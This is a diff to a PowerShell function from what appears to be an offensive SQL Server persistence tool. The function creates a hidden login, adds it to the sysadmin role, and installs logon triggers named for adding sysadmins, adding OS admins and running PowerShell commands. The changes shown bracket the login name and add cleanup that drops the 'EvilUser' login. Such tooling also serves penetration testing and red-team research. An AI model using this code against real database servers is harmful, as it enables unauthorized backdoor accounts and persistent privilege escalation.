@@ -416,7 +416,7 @@ function Invoke-SqlServer-Persist-TriggerLogon
         
         # Create query
         $Query_SysAdmin = "IF NOT EXISTS (SELECT * FROM sys.syslogins WHERE name = ''$NewSqlUser'')
-        exec(''CREATE LOGIN $NewSqlUser WITH PASSWORD = ''''$NewSqlPass'''';EXEC sp_addsrvrolemember ''''$NewSqlUser'''', ''''sysadmin'''';'')"
+        exec(''CREATE LOGIN [$NewSqlUser] WITH PASSWORD = ''''$NewSqlPass'''';EXEC sp_addsrvrolemember ''''$NewSqlUser'''', ''''sysadmin'''';'')"
 
         # Open db connection
         $conn.Open()
@@ -467,7 +467,8 @@ function Invoke-SqlServer-Persist-TriggerLogon
         $Query = "IF EXISTS (SELECT * FROM sys.server_triggers WHERE name = 'evil_logon_trigger') 
         DROP TRIGGER [evil_logon_trigger_addsysadmin] ON ALL SERVER;
         DROP TRIGGER [evil_logon_trigger_addosadmin] ON ALL SERVER;
-        DROP TRIGGER [evil_logon_trigger_pscmd] ON ALL SERVER;"
+        DROP TRIGGER [evil_logon_trigger_pscmd] ON ALL SERVER;
+        DROP LOGIN [EvilUser];"
 
         $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
         $results = $cmd.ExecuteReader() 
